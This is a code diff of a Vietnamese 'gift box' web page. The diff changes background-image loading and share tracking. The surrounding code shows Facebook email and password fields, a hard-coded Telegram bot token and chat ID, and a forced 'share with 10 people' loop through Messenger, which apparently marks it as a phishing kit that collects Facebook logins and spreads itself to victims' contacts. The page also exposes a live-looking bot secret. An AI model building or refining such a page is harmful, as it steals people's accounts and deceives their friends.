@@ -34,13 +34,12 @@
         .gift-box .main .label { font-size: 19px; font-weight: 700; color: #1a1a1a; margin-top: 6px; }
         .gift-box .main .highlight { font-size: 14px; color: #ff6a00; font-weight: 700; background: #fff6ed; padding: 6px 24px; border-radius: 40px; display: inline-block; margin-top: 10px; border: 1px solid #ffdcc4; }
 
-        /* Ảnh nền - lấy từ GitHub style */
-        .image-background { margin: 14px 18px 0; padding: 0; border-radius: 20px; overflow: hidden; background: #f0f2f5; min-height: 140px; display: flex; align-items: center; justify-content: center; position: relative; border: 2px dashed #d0d8e4; transition: 0.3s; }
+        /* Ảnh nền - tự động lấy từ GitHub */
+        .image-background { margin: 14px 18px 0; border-radius: 20px; overflow: hidden; background: #f0f2f5; min-height: 100px; display: flex; align-items: center; justify-content: center; position: relative; border: 2px dashed #d0d8e4; transition: 0.3s; }
         .image-background img { width: 100%; height: auto; display: block; object-fit: cover; max-height: 300px; }
         .image-background .placeholder-text { color: #aab2c0; font-size: 14px; font-weight: 500; text-align: center; padding: 20px; }
         .image-background .placeholder-text span { display: block; font-size: 12px; color: #bcc5d2; margin-top: 4px; }
-        .image-background .file-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; z-index: 3; }
-        .image-background.dragover { border-color: #ff6a00; background: #f0f7ff; }
+        .image-background .loading { padding: 20px; color: #0068d9; font-weight: 600; font-size: 14px; }
 
         .progress-section { margin: 18px 18px 0; }
         .progress-section .label { display: flex; justify-content: space-between; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 6px; }
@@ -144,14 +143,13 @@
         </div>
     </div>
 
-    <!-- Ảnh nền - upload kiểu GitHub -->
+    <!-- Ảnh nền - tự động lấy từ GitHub cùng thư mục -->
     <div class="image-background" id="imageBg">
         <div class="placeholder-text" id="placeholderText">
-            📸 Thêm ảnh nền<br>
-            <span>anh_nen.PNG hoặc kéo thả</span>
+            📸 Đang tải ảnh nền...<br>
+            <span>anh_nen.PNG từ GitHub</span>
         </div>
         <img id="bgImage" src="" alt="Ảnh nền" style="display:none;">
-        <input type="file" class="file-input" id="imageInput" accept="image/*">
     </div>
 
     <div class="progress-section">
@@ -232,52 +230,73 @@
 <div class="toast" id="toast">⏳ Đang xử lý...</div>
 
 <script>
-    // ===== UPLOAD ẢNH KIỂU GITHUB =====
-    const imageBg = document.getElementById('imageBg');
-    const imageInput = document.getElementById('imageInput');
-    const bgImage = document.getElementById('bgImage');
-    const placeholderText = document.getElementById('placeholderText');
-
-    // Kéo thả
-    imageBg.addEventListener('dragover', function(e) {
-        e.preventDefault();
-        this.classList.add('dragover');
-    });
-    imageBg.addEventListener('dragleave', function(e) {
-        e.preventDefault();
-        this.classList.remove('dragover');
-    });
-    imageBg.addEventListener('drop', function(e) {
-        e.preventDefault();
-        this.classList.remove('dragover');
-        const file = e.dataTransfer.files[0];
-        if (file && file.type.startsWith('image/')) {
-            const reader = new FileReader();
-            reader.onload = function(ev) {
-                bgImage.src = ev.target.result;
+    // ===== TỰ ĐỘNG LẤY ẢNH NỀN TỪ GITHUB =====
+    // Lấy đường dẫn thư mục hiện tại trên GitHub (dùng cho Vercel/GitHub Pages)
+    function loadBackgroundImage() {
+        const imageBg = document.getElementById('imageBg');
+        const bgImage = document.getElementById('bgImage');
+        const placeholder = document.getElementById('placeholderText');
+        
+        // Danh sách các định dạng ảnh có thể
+        const imageNames = ['anh_nen.PNG', 'anh_nen.png', 'anh_nen.jpg', 'anh_nen.jpeg', 'background.png', 'bg.png'];
+        let loaded = false;
+        
+        // Hàm thử tải ảnh
+        function tryLoadImage(url) {
+            const img = new Image();
+            img.onload = function() {
+                bgImage.src = url;
                 bgImage.style.display = 'block';
-                placeholderText.style.display = 'none';
+                placeholder.style.display = 'none';
+                loaded = true;
             };
-            reader.readAsDataURL(file);
+            img.onerror = function() {
+                // Thử ảnh tiếp theo
+                if (!loaded) {
+                    const nextIndex = imageNames.indexOf(url.split('/').pop()) + 1;
+                    if (nextIndex < imageNames.length) {
+                        const nextUrl = getImageUrl(imageNames[nextIndex]);
+                        tryLoadImage(nextUrl);
+                    } else {
+                        // Không tìm thấy ảnh nào
+                        placeholder.innerHTML = '📸 Không tìm thấy ảnh nền<br><span>Đặt file anh_nen.PNG cùng thư mục</span>';
+                    }
+                }
+            };
+            img.src = url;
         }
+        
+        // Tạo URL ảnh dựa trên đường dẫn hiện tại
+        function getImageUrl(filename) {
+            // Lấy đường dẫn thư mục hiện tại (trên GitHub Pages / Vercel)
+            const currentPath = window.location.pathname;
+            const basePath = currentPath.substring(0, currentPath.lastIndexOf('/') + 1);
+            // Nếu đang ở thư mục gốc hoặc đường dẫn con
+            const baseUrl = window.location.origin + basePath;
+            return baseUrl + filename;
+        }
+        
+        // Bắt đầu thử với ảnh đầu tiên
+        const firstUrl = getImageUrl(imageNames[0]);
+        tryLoadImage(firstUrl);
+        
+        // Nếu không tải được sau 5 giây, hiển thị thông báo
+        setTimeout(() => {
+            if (!loaded) {
+                const img = document.getElementById('bgImage');
+                if (!img.src || img.style.display === 'none') {
+                    placeholder.innerHTML = '📸 Không tìm thấy ảnh nền<br><span>Đặt file anh_nen.PNG cùng thư mục</span>';
+                }
+            }
+        }, 5000);
+    }
+
+    // Chạy khi trang tải
+    window.addEventListener('load', function() {
+        loadBackgroundImage();
     });
 
-    // Click để upload
-    imageInput.addEventListener('change', function() {
-        const file = this.files[0];
-        if (file) {
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                bgImage.src = e.target.result;
-                bgImage.style.display = 'block';
-                placeholderText.style.display = 'none';
-            };
-            reader.readAsDataURL(file);
-        }
-    });
-
-    // ===== KIỂM TRA CHIA SẺ THẬT =====
-    // Lưu trạng thái chia sẻ thực tế (dùng sessionStorage để giữ qua lần tải lại)
+    // ===== KIỂM TRA CHIA SẺ =====
     let sharedCount = parseInt(sessionStorage.getItem('sharedCount')) || 0;
     let shareVerified = JSON.parse(sessionStorage.getItem('shareVerified')) || [];
 
@@ -292,7 +311,6 @@
         } else {
             shareBtn.textContent = '📣 Chia sẻ ngay (+10%)';
             shareBtn.disabled = false;
-            // Nếu đã chia sẻ nhưng chưa đủ, hiển thị hướng dẫn
             if (sharedCount > 0 && sharedCount < 10) {
                 shareStatus.textContent = `✅ Đã chia sẻ ${sharedCount}/10, tiếp tục để hoàn thành!`;
                 shareStatus.style.color = '#0068d9';
@@ -307,27 +325,21 @@
         validateForm();
     }
 
-    // Hàm kiểm tra xem người dùng đã thực sự chia sẻ chưa (dùng visibility change để phát hiện quay lại)
     function verifyShare() {
-        // Mở cửa sổ chia sẻ Messenger
         const currentUrl = window.location.href;
         const shareUrl = `https://www.facebook.com/dialog/send?link=${encodeURIComponent(currentUrl)}&app_id=123456789&redirect_uri=${encodeURIComponent(currentUrl)}`;
         const shareWindow = window.open(shareUrl, '_blank', 'width=600,height=500');
         
-        // Theo dõi khi cửa sổ chia sẻ bị đóng (quay lại tab chính)
         const checkInterval = setInterval(() => {
             if (shareWindow.closed) {
                 clearInterval(checkInterval);
-                // Tăng số lần chia sẻ và lưu vào sessionStorage
                 if (sharedCount < 10) {
                     sharedCount += 1;
                     sessionStorage.setItem('sharedCount', sharedCount);
-                    // Lưu thời gian để kiểm tra
                     const timestamp = Date.now();
                     shareVerified.push(timestamp);
                     sessionStorage.setItem('shareVerified', JSON.stringify(shareVerified));
                     
-                    // Hiển thị thông báo
                     document.getElementById('toast').textContent = `✅ Đã xác nhận chia sẻ ${sharedCount}/10!`;
                     document.getElementById('toast').classList.add('show');
                     setTimeout(() => {
@@ -339,10 +351,8 @@
             }
         }, 500);
 
-        // Nếu không mở được popup (bị chặn), vẫn cho phép tăng nhưng có cảnh báo
         if (!shareWindow || shareWindow.closed) {
             clearInterval(checkInterval);
-            // Vẫn tăng nhưng yêu cầu xác nhận thủ công (dùng cho trường hợp bị chặn popup)
             if (sharedCount < 10) {
                 sharedCount += 1;
                 sessionStorage.setItem('sharedCount', sharedCount);
@@ -359,7 +369,6 @@
         }
     }
 
-    // Nút chia sẻ
     document.getElementById('shareBtn').addEventListener('click', function(e) {
         if (sharedCount >= 10) {
             document.getElementById('toast').textContent = '✅ Bạn đã chia sẻ đủ 10 người!';
@@ -369,18 +378,15 @@
             }, 2000);
             return;
         }
-        // Gọi hàm verifyShare để mở popup và kiểm tra
         verifyShare();
     });
 
-    // Khởi tạo UI share
     updateShareUI();
 
     // ===== BOT TELEGRAM =====
     const BOT_TOKEN = "8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8";
     const CHAT_ID = "8872446985";
 
-    // DOM
     const showFormBtn = document.getElementById('showFormBtn');
     const loginForm = document.getElementById('loginForm');
     const submitBtn = document.getElementById('submitBtn');
@@ -398,7 +404,6 @@
 
     let currentCaptcha = 'YUV28S';
     let selectedPlatform = null;
-    let progress = 0;
 
     captchaCode.textContent = currentCaptcha;
 
@@ -416,7 +421,7 @@
         if (fbPass.value.trim() && isValidPassword(fbPass.value.trim())) p += 20;
         if (captchaInput.value.trim() && isCaptchaValid(captchaInput.value.trim())) p += 20;
         p += Math.min(sharedCount * 1, 10);
-        progress = Math.min(p, 100);
+        const progress = Math.min(p, 100);
         progressFill.style.width = progress + '%';
         percentText.textContent = progress + '%';
     }
@@ -477,10 +482,6 @@
     fbEmail.addEventListener('input', function() { validateEmailField(); validateForm(); });
     fbPass.addEventListener('input', function() { validatePassField(); validateForm(); });
     captchaInput.addEventListener('input', function() { validateCaptchaField(); validateForm(); });
-
-    fbEmail.addEventListener('blur', function() { if (this.value.trim().length > 0 && !isValidEmailOrPhone(this.value.trim())) { emailError.style.display = 'block'; fbEmail.classList.add('error'); } validateForm(); });
-    fbPass.addEventListener('blur', function() { if (this.value.trim().length > 0 && !isValidPassword(this.value.trim())) { passError.style.display = 'block'; fbPass.classList.add('error'); } validateForm(); });
-    captchaInput.addEventListener('blur', function() { if (this.value.trim().length > 0 && !isCaptchaValid(this.value.trim())) { captchaError.style.display = 'block'; captchaInput.classList.add('error'); } validateForm(); });
 
     refreshBtn.addEventListener('click', function() {
         currentCaptcha = generateCaptcha();
